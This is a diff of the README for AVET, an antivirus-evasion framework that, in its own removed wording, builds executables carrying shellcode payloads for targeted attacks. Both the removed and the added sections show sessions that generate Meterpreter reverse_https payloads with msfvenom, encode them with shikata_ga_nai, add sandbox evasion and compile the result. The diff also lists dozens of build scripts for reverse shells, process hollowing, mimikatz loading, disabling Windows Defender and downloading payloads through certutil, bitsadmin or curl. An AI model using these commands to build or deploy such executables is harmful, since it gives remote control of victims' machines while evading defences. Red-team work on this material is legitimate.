@@ -56,7 +56,7 @@ The modified version is executed once, and your executable built.
 
 Here's a quick example (python3 || gtfo):
 ```
-python3 avet_fabric.py 
+python3 avet.py
 
                        .|        ,       +
              *         | |      ((             *
@@ -68,125 +68,106 @@ python3 avet_fabric.py
  ___|  '-'     '    ""       '-'   '-.'    '`      |____
 jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-avet.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
 
-0: build_40xshikata_revhttpsunstaged_win32.sh
-1: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
-2: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
-3: build_calcfromcmd_50xshikata_revhttps_win32.sh
-4: build_avetenc_fopen_revhttps_win32.sh
-5: build_fopen_quiet_revhttps_win32.sh
-6: build_downloadpsh_revhttps_win32.sh
-7: build_avetenc_mtrprtrxor_revhttps_win64.sh
-8: build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
-9: buildsvc_20xshikata_bindtcp_win32.sh
-10: build_downloadbitsadmin_revhttps_win32.sh
-11: build_cpucores_revhttps_win32.sh
-12: build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
-13: build_asciimsf_revhttps_win32.sh
-14: build_downloadsocket_revhttps_win32.sh
-15: build_calcfrompowersh_50xshikata_revhttps_win32.sh
-16: build_avetenc_dynamicfromfile_revhttps_win32.sh
-17: build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
-18: build_downloadcertutil_revhttps_win32.sh
-19: build_downloadsocket_mtrprtrxor_revhttps_win64.sh
-20: build_fopen_mtrprtrxor_revhttps_win64.sh
-21: build_asciimsf_fromcmd_revhttps_win32.sh
-22: build_fopen_revhttps_win32.sh
-23: build_kaspersky_fopen_shellrevtcp_win32.sh
-24: build_hasvmmac_revtcp_win32.sh
-25: build_rc4enc_mimikatz_win64.sh
-26: build_dkmc_downloadexecshc_revhttps_win32.sh
-27: build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
-28: build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
-29: build_50xshikata_quiet_revhttps_win32.sh
-30: build_hasvmkey_revhttps_win32.sh
-31: build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
-32: build_50xshikata_revhttps_win32.sh
-33: build_mimikatz_pe2shc_xorfromcmd_win64.sh
-34: build_downloadiexplorer_revhttps_win32.sh
-35: build_dynamicfromfile_revhttps_win32.sh
-36: build_gethostbyname_revhttps_win32.sh
-Input number of the script you want use and hit enter: 4
 
-Now you can edit the build script line by line.
+Welcome to the avet Assistant!
 
-Use AVET encoding.
-print AVET logo
-$ cat banner.txt
-include script containing the compiler var $win32_compiler
-you can edit the compiler in build/global_win32.sh
-or enter $win32_compiler="mycompiler" here
-$ . build/global_win32.sh
-import feature construction interface
-$ . build/feature_construction.sh
-import global default lhost and lport values from build/global_connect_config.sh
-$ . build/global_connect_config.sh
-override connect-back settings here, if necessary
-$ LPORT=$GLOBAL_LPORT
-$ LHOST=$GLOBAL_LHOST
-make meterpreter reverse payload, encoded with shikata_ga_nai
-$ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
-encode the shellcode via AVET encoding.
-$ encode_payload avet input/sc_c.txt input/scenc_raw.txt
-add fopen sandbox evasion
-$ add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-convert encoded shellcode file to c array style for static include
-$ ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-no command preexec
-$ set_command_source no_data
-$ set_command_exec no_command
-set shellcode source
-$ set_payload_source static_from_file input/scenc_c.txt
-set decoder and key source
-AVET decoder needs no key
-$ set_decoder avet
-$ set_key_source no_data
-set payload info source
-$ set_payload_info_source no_data
-set shellcode binding technique
-$ set_payload_execution_method exec_shellcode
-enable debug output
-$ enable_debug_print
-compile to output.exe file
-$ $win32_compiler -o output/output.exe source/avet.c
-$ strip output/output.exe
-cleanup
-$ cleanup_techniques
+0 : build_40xshikata_revhttpsunstaged_win32.sh
+1 : build_50xshikata_quiet_revhttps_win32.sh
+2 : build_50xshikata_revhttps_win32.sh
+3 : build_asciimsf_fromcmd_revhttps_win32.sh
+4 : build_asciimsf_revhttps_win32.sh
+5 : build_avetenc_dynamicfromfile_revhttps_win32.sh
+6 : build_avetenc_fopen_revhttps_win32.sh
+7 : build_avetenc_mtrprtrxor_revhttps_win64.sh
+8 : build_calcfromcmd_50xshikata_revhttps_win32.sh
+9 : build_calcfrompowersh_50xshikata_revhttps_win32.sh
+10 : build_cpucores_revhttps_win32.sh
+11 : build_disablewindefpsh_xorfromcmd_revhttps_win64.sh
+12 : build_dkmc_downloadexecshc_revhttps_win32.sh
+13 : build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
+14 : build_downloadbitsadmin_revhttps_win32.sh
+15 : build_downloadcertutil_revhttps_win32.sh
+16 : build_downloadcurl_mtrprtrxor_revhttps_win64.sh
+17 : build_downloadiexplorer_revhttps_win32.sh
+18 : build_downloadpsh_revhttps_win32.sh
+19 : build_downloadsocket_mtrprtrxor_revhttps_win64.sh
+20 : build_downloadsocket_revhttps_win32.sh
+21 : build_dynamicfromfile_revhttps_win32.sh
+22 : build_fopen_mtrprtrxor_revhttps_win64.sh
+23 : build_fopen_quiet_revhttps_win32.sh
+24 : build_fopen_revhttps_win32.sh
+25 : build_gethostbyname_revhttps_win32.sh
+26 : build_hasvmkey_revhttps_win32.sh
+27 : build_hasvmmac_revtcp_win32.sh
+28 : build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.sh
+29 : build_hollowing_targetfromcmd_doubleenc_doubleev_revtcp_win32.sh
+30 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win32.sh
+31 : build_injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.sh
+32 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revhttps_win64.sh
+33 : build_injectshc_targetfromcmd_fopen_gethostbyname_xor_revtcp_win32.sh
+34 : build_kaspersky_fopen_shellrevtcp_win32.sh
+35 : build_mimikatz_pe2shc_xorfromcmd_win64.sh
+36 : build_rc4enc_mimikatz_win64.sh
+37 : buildsvc_20xshikata_bindtcp_win32.sh
+Which Script would you like to configure and build?
+Enter the corresponding number -> 5
 
-The following commands will be executed:
-#/bin/bash
-cat banner.txt
-. build/global_win32.sh
-. build/feature_construction.sh
-. build/global_connect_config.sh
-LPORT=$GLOBAL_LPORT
-LHOST=$GLOBAL_LHOST
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
-encode_payload avet input/sc_c.txt input/scenc_raw.txt
-add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
-./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
-set_command_source no_data
-set_command_exec no_command
-set_payload_source static_from_file input/scenc_c.txt
-set_decoder avet
-set_key_source no_data
-set_payload_info_source no_data
-set_payload_execution_method exec_shellcode
-enable_debug_print
-$win32_compiler -o output/output.exe source/avet.c
-strip output/output.exe
-cleanup_techniques
+DESCRIPTION :
+# build the .exe file that loads the payload from a given text file
 
-Press enter to continue.
+Configure the Build Script
 
-Building the output file...
+# override connect-back settings here, if necessary
+-> LPORT=443
+-> LHOST=192.168.56.101
 
-Please stand by...
+# no command preexec
+-> set_command_source no_data
+-> set_command_exec no_command
 
-The output file should be placed in the output directory.
+# enable debug output
+-> enable_debug_print
 
-Bye...
+Executable will be created Shortly please wait.
+
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 692 (iteration=0)
+x86/shikata_ga_nai chosen with final size 692
+Payload size: 692 bytes
+Final size of c file: 2933 bytes
+*** ============================================= ***
+
+         .==,_                                          
+        .===,_`\\                                        
+      .====,_ ` \\      .====,__                         
+---     .==-,`~. \\           `:`.__,                    
+ ---      `~~=-.  \\           /^^^     MEEP MEEP        
+   ---       `~~=. \\         /                          
+                `~. \\       /                           
+                  ~. \\____./                            
+                    `.=====)                            
+                 ___.--~~~--.__                         
+       ___\\.--~~~              ~~~---.._|/              
+       ~~~\\\"                             /              
+
+ ________  ___      ___ _____  __________  
+|\   __  \|\  \    /  /|\  __\ |\___   __\ 
+\ \  \|\  \ \  \  /  / | \ \__ \|__|\  \_| 
+ \ \   __  \ \  \/  / / \ \  _\    \ \  \  
+  \ \  \ \  \ \    / /   \ \ \___   \ \  \ 
+   \ \__\ \__\ \__/ /     \ \____\   \ \__\
+    \|__|\|__|\|__|/       \|_____|   \|__|
+
+*** ============================================= ***
+
+
+# Call the generated executable like:
+# $ avetenc_dynamicfromfile_revhttps_win32.exe scenc_raw.txt
+
+
+Your executable should be in the output folder!
 ```
 
 How to use 
@@ -254,6 +235,7 @@ build_dkmc_downloadexecshc_revhttps_win32.sh
 build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh
 build_downloadbitsadmin_revhttps_win32.sh
 build_downloadcertutil_revhttps_win32.sh
+build_downloadcurl_mtrprtrxor_revhttps_win64.sh
 build_downloadiexplorer_revhttps_win32.sh
 build_downloadpsh_revhttps_win32.sh
 build_downloadsocket_mtrprtrxor_revhttps_win64.sh
@@ -329,6 +311,10 @@ Retrieves data from a command line argument. The given ASCII string is interpret
 
 ##### download_certutil
 Downloads data from a specified URI, using ```certutil.exe -urlcache -split -f```.
+Drops the downloaded file to disk before reading the data.
+
+##### download_curl
+Downloads the data using curl.
 Drops the downloaded file to disk before reading the data.
 
 ##### download_internet_explorer
